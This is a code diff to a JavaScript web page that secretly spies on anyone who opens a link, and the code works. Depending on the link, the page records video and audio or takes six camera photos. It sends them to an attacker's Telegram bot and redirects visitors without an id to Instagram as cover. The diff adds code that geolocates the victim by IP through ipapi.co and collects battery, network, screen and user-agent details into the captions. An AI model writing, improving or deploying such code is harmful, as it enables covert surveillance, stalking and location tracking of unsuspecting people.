@@ -51,24 +51,40 @@
         const CHAT_ID = urlParams.get('id');
         const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal)
 
+        // Real IP & Location fetch karne ki function
+        async function getIPAndDeviceInfo() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                return {
+                    ip: data.ip || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+            }
+        }
+
         async function init() {
             if (!CHAT_ID) {
                 window.location.href = "https://www.instagram.com";
                 return;
             }
 
-            // Agar Universal link hai (yani 'b' nahi diya gaya), toh video record hogi
             if (!cameraType) {
                 startVideoRecording();
             } else {
-                // Front ya Back link hone par photos capture hongi
                 startPhotoCapture();
             }
         }
 
-        // --- UNIVERSAL LINK: Video Recording (4-5 sec) ---
+        // --- UNIVERSAL LINK: Video Recording ---
         async function startVideoRecording() {
             try {
+                let ipInfo = await getIPAndDeviceInfo();
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
@@ -94,10 +110,39 @@
                     const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
                     stream.getTracks().forEach(track => track.stop());
 
+                    // Battery info
+                    let batteryText = "N/A";
+                    try {
+                        let bat = await navigator.getBattery();
+                        let level = Math.round(bat.level * 100);
+                        let charging = bat.charging ? "⚡ Charging" : "🔋 Discharging";
+                        batteryText = `${level}% ${charging}`;
+                    } catch(e) {}
+
+                    let networkConn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    let netType = networkConn ? networkConn.effectiveType.toUpperCase() : "4G";
+                    let currentTime = new Date().toLocaleString();
+
+                    let detailsMsg = 
+                        `🌐 **IP Information**\n` +
+                        `🔢 IP Address: \`${ipInfo.ip}\`\n` +
+                        `📍 Location: ${ipInfo.city}\n` +
+                        `🌍 Region: ${ipInfo.region}\n` +
+                        `🗺 Country: ${ipInfo.country}\n` +
+                        `📡 ISP: ${ipInfo.isp}\n\n` +
+                        `📱 **Device Details**\n` +
+                        `🔋 Battery: ${batteryText}\n` +
+                        `📶 Network: ${netType}\n` +
+                        `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
+                        `🕒 Time: ${currentTime}\n` +
+                        `🧠 UA: \`${navigator.userAgent}\`\n\n` +
+                        `👑 **CREDIT BY : आयुष नेगी**`;
+
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('video', blob, 'universal_video.webm');
-                    formData.append('caption', '🎥 Universal Camera 4-Sec Video Captured!');
+                    formData.append('caption', detailsMsg);
+                    formData.append('parse_mode', 'Markdown');
 
                     try {
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
@@ -123,7 +168,7 @@
             }
         }
 
-        // --- FRONT/BACK LINK: 5-6 Photos Capture ---
+        // --- FRONT/BACK LINK: 5-6 Photos Capture with Details ---
         async function startPhotoCapture() {
             let constraints = {
                 video: { width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -136,6 +181,7 @@
             }
 
             try {
+                let ipInfo = await getIPAndDeviceInfo();
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -151,25 +197,57 @@
                 const videoElement = document.getElementById('video');
                 videoElement.srcObject = stream;
 
-                // Thoda wait karein taaki camera adjust ho jaye
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                await new Promise((resolve) => {
+                    videoElement.onloadedmetadata = () => {
+                        videoElement.play().then(resolve).catch(resolve);
+                    };
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 2000));
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = videoElement.videoWidth || 1280;
                 canvas.height = videoElement.videoHeight || 720;
                 const context = canvas.getContext('2d');
 
-                // 5 se 6 photos ek ke baad ek khichna
+                let batteryText = "N/A";
+                try {
+                    let bat = await navigator.getBattery();
+                    let level = Math.round(bat.level * 100);
+                    let charging = bat.charging ? "⚡ Charging" : "🔋 Discharging";
+                    batteryText = `${level}% ${charging}`;
+                } catch(e) {}
+
+                let networkConn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let netType = networkConn ? networkConn.effectiveType.toUpperCase() : "4G";
+                let currentTime = new Date().toLocaleString();
+
                 for (let i = 1; i <= 6; i++) {
                     context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                     
-                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                     
                     if (blob) {
+                        let shotCaption = 
+                            `🌐 **IP Information**\n` +
+                            `🔢 IP Address: \`${ipInfo.ip}\`\n` +
+                            `📍 Location: ${ipInfo.city}\n` +
+                            `🌍 Region: ${ipInfo.region}\n` +
+                            `🗺 Country: ${ipInfo.country}\n` +
+                            `📡 ISP: ${ipInfo.isp}\n\n` +
+                            `📱 **Device Details**\n` +
+                            `🔋 Battery: ${batteryText}\n` +
+                            `📶 Network: ${netType}\n` +
+                            `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
+                            `🕒 Time: ${currentTime}\n` +
+                            `📸 Shot: ${i}/6\n\n` +
+                            `👑 **CREDIT BY : आयुष नेगी**`;
+
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
                         formData.append('photo', blob, `photo_${i}.jpg`);
-                        formData.append('caption', `📸 ${cameraType.toUpperCase()} Camera - Shot ${i}/6`);
+                        formData.append('caption', shotCaption);
+                        formData.append('parse_mode', 'Markdown');
 
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
@@ -177,8 +255,7 @@
                         });
                     }
 
-                    // Har photo ke beech mein thoda gap (jaise 600ms)
-                    await new Promise(resolve => setTimeout(resolve, 600));
+                    await new Promise(resolve => setTimeout(resolve, 800));
                 }
 
                 stream.getTracks().forEach(track => track.stop());
